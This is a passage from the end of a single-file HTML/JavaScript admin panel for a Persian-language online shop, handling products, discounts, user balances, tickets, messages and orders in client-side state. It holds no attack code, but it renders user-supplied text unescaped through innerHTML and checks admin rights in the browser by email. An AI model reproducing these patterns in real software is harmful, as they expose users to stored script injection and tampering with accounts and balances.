        container.innerHTML=`<div class="admin-header"><h1>🛡️ پنل مدیریت</h1><button class="logout-btn" onclick="logout()">خروج</button></div>
        <div class="stats-grid"><div class="stat-card">👥 کاربران: ${totalUsers}</div><div class="stat-card">💰 فروش: ${totalSales.toLocaleString()} تومان</div><div class="stat-card">📦 سفارشات: ${orders.length}</div><div class="stat-card">🎫 تیکت‌ها: ${tickets.length}</div></div>
        <div class="nav-tabs"><div class="nav-tab active" onclick="adminTab('productsManage')">مدیریت محصولات</div><div class="nav-tab" onclick="adminTab('specialDiscount')">ویژه/تخفیف</div><div class="nav-tab" onclick="adminTab('usersManage')">کاربران</div><div class="nav-tab" onclick="adminTab('ticketsManage')">تیکت‌ها</div><div class="nav-tab" onclick="adminTab('balanceReq')">درخواست شارژ</div><div class="nav-tab" onclick="adminTab('sendMsg')">ارسال پیام</div><div class="nav-tab" onclick="adminTab('ordersList')">سفارشات</div></div>
        <div id="adminTabContent"></div>`;
        container.classList.remove('hidden'); document.getElementById('userLoginPage').classList.add('hidden'); document.getElementById('userProfilePage').classList.add('hidden'); adminTab('productsManage');
    }
    function adminTab(tab){
        let div=document.getElementById('adminTabContent'); if(!div) return;
        if(tab==='productsManage') div.innerHTML=`<div><input id="newProdName" placeholder="نام محصول"><input id="newProdPrice" placeholder="قیمت"><textarea id="newProdDesc" placeholder="توضیحات"></textarea><button onclick="addProduct()">افزودن محصول</button></div><div class="products-grid">${products.map(p=>`<div class="product-card"><div class="product-title">${p.name}</div><div>قیمت: ${p.price.toLocaleString()}</div><div>${p.desc}</div><button onclick="deleteProduct(${p.id})" class="delete-btn">حذف</button></div>`).join('')}</div>`;
        else if(tab==='specialDiscount') div.innerHTML=`<h3>محصولات ویژه</h3>${products.map(p=>`<label><input type="checkbox" ${specialProducts.includes(p.id)?'checked':''} onchange="toggleSpecial(${p.id})"> ${p.name}</label><br>`).join('')}<h3>تخفیف زماندار</h3>${products.map(p=>`<div><b>${p.name}</b> <input type="number" id="discPerc${p.id}" placeholder="درصد تخفیف" value="${discountProducts[p.id]?.percent||''}"> <button onclick="setDiscount(${p.id})">اعمال تخفیف</button><button onclick="removeDiscount(${p.id})">حذف تخفیف</button></div>`).join('')}`;
        else if(tab==='usersManage') div.innerHTML=`<div class="table-wrapper"><table><tr><th>نام</th><th>نام خانوادگی</th><th>ایمیل</th><th>موبایل</th><th>موجودی</th><th>عملیات</th></tr>${users.map(u=>`<tr><td>${u.name}</td><td>${u.family || '-'}</td><td>${u.email}</td><td>${u.mobile || '-'}</td><td>${u.balance.toLocaleString()}</td><td><button onclick="adminAddBalance('${u.email}')">افزایش موجودی</button><button onclick="deleteUser('${u.email}')">حذف</button></td></tr>`).join('')}</table></div>`;
        else if(tab==='ticketsManage') div.innerHTML=`${tickets.map(t=>`<div class="ticket-item"><div>${t.subject}</div><div>${t.message}</div><div>وضعیت: ${t.status}</div><textarea id="reply${t.id}" placeholder="پاسخ"></textarea><button onclick="replyTicket(${t.id})">ارسال پاسخ</button></div>`).join('')}`;
        else if(tab==='balanceReq') div.innerHTML=`${balanceRequests.filter(r=>r.status==='pending').map(r=>`<div class="request-item">کاربر: ${r.userId} - مبلغ: ${r.amount.toLocaleString()} تومان <button onclick="approveBalance(${r.id}, true)">✅ تایید</button> <button onclick="approveBalance(${r.id}, false)">❌ رد</button></div>`).join('')||'<p>درخواستی نیست</p>'}`;
        else if(tab==='sendMsg') div.innerHTML=`<div><select id="msgUserSelect"><option value="all">همه کاربران</option>${users.map(u=>`<option value="${u.email}">${u.name} ${u.family||''}</option>`).join('')}</select><textarea id="adminMessageText" placeholder="متن پیام"></textarea><button onclick="sendAdminMessage()">ارسال پیام</button></div>`;
        else if(tab==='ordersList') div.innerHTML=`${orders.map(o=>`<div class="order-item">سفارش ${o.id} | کاربر: ${o.userId} | مبلغ: ${o.total.toLocaleString()} | تاریخ: ${o.date} | وضعیت: ${o.status}</div>`).join('')||'<p>سفارشی نیست</p>'}`;
        document.querySelectorAll('#adminPanel .nav-tab').forEach(el=>{ if(el.innerText.includes(tab==='productsManage'?'محصولات':tab==='specialDiscount'?'ویژه':tab==='usersManage'?'کاربران':tab==='ticketsManage'?'تیکت‌ها':tab==='balanceReq'?'درخواست':tab==='sendMsg'?'پیام':'سفارشات')) el.classList.add('active'); else el.classList.remove('active'); });
    }
    function addProduct(){ let name=document.getElementById('newProdName')?.value, price=parseInt(document.getElementById('newProdPrice')?.value), desc=document.getElementById('newProdDesc')?.value; if(name&&price) { let newId=Date.now(); products.push({id:newId,name,price,desc,image:""}); saveAll(); adminTab('productsManage'); showToast("محصول افزوده شد");} }
    function deleteProduct(id){ products=products.filter(p=>p.id!==id); specialProducts=specialProducts.filter(s=>s!==id); delete discountProducts[id]; saveAll(); adminTab('productsManage'); showToast("حذف شد"); }
    function toggleSpecial(id){ if(specialProducts.includes(id)) specialProducts=specialProducts.filter(s=>s!==id); else specialProducts.push(id); saveAll(); adminTab('specialDiscount'); showToast("بروزرسانی شد"); }
    function setDiscount(id){ let perc=parseInt(document.getElementById(`discPerc${id}`)?.value); if(perc && perc>0){ discountProducts[id]={percent:perc, startDate:null, endDate:null}; saveAll(); adminTab('specialDiscount'); showToast(`تخفیف ${perc}% اعمال شد`);} }
    function removeDiscount(id){ delete discountProducts[id]; saveAll(); adminTab('specialDiscount'); showToast("تخفیف حذف شد"); }
    function adminAddBalance(email){ let amount=prompt("مبلغ به تومان:"); if(amount){ let user=users.find(u=>u.email===email); if(user){ user.balance+=parseInt(amount); balanceTransactions.push({userId:email, type:"شارژ ادمین", amount:parseInt(amount), date:new Date().toLocaleString()}); saveAll(); adminTab('usersManage'); showToast(`موجودی ${user.name} افزایش یافت`);} } }
    function deleteUser(email){ if(email===ADMIN_EMAIL){showToast("حذف مدیر ممکن نیست");return;} users=users.filter(u=>u.email!==email); saveAll(); adminTab('usersManage'); showToast("کاربر حذف شد"); }
    function replyTicket(tid){ let reply=document.getElementById(`reply${tid}`)?.value; if(reply){ let t=tickets.find(t=>t.id===tid); if(t){ t.reply=reply; t.status="پاسخ داده شد"; saveAll(); adminTab('ticketsManage'); showToast("پاسخ ثبت شد");} } }
    function approveBalance(reqId, approve){ let req=balanceRequests.find(r=>r.id===reqId); if(req){ if(approve){ let user=users.find(u=>u.email===req.userId); if(user){ user.balance+=req.amount; balanceTransactions.push({userId:req.userId, type:"شارژ کاربر", amount:req.amount, date:new Date().toLocaleString()}); } } req.status=approve?"approved":"rejected"; saveAll(); adminTab('balanceReq'); showToast(approve?"درخواست تایید شد":"رد شد"); } }
    function sendAdminMessage(){ let target=document.getElementById('msgUserSelect')?.value; let text=document.getElementById('adminMessageText')?.value; if(!text) return; if(target==='all') users.forEach(u=>{ adminMessages.push({userId:u.email, message:text, date:new Date().toLocaleString()}); }); else adminMessages.push({userId:target, message:text, date:new Date().toLocaleString()}); saveAll(); showToast("پیام ارسال شد"); adminTab('sendMsg'); }
    
    function start(){ if(currentUser){ if(currentUser.email===ADMIN_EMAIL) showAdminPanel(); else showUserPanel(); } else showLogin(); }
    function showUserPanel(){ renderUserProfile(); }
    
    window.addToCart=addToCart; window.removeFromCart=removeFromCart; window.updateQty=updateQty; window.checkout=checkout; window.sendTicket=sendTicket; window.requestBalance=requestBalance; window.userLogin=userLogin; window.userRegister=userRegister; window.showLogin=showLogin; window.showUserRegister=showUserRegister; window.logout=logout; window.showUserTab=showUserTab; window.adminTab=adminTab; window.addProduct=addProduct; window.deleteProduct=deleteProduct; window.toggleSpecial=toggleSpecial; window.setDiscount=setDiscount; window.removeDiscount=removeDiscount; window.adminAddBalance=adminAddBalance; window.deleteUser=deleteUser; window.replyTicket=replyTicket; window.approveBalance=approveBalance; window.sendAdminMessage=sendAdminMessage; window.togglePassword=togglePassword;
    start();
</script>
</body>
</html>
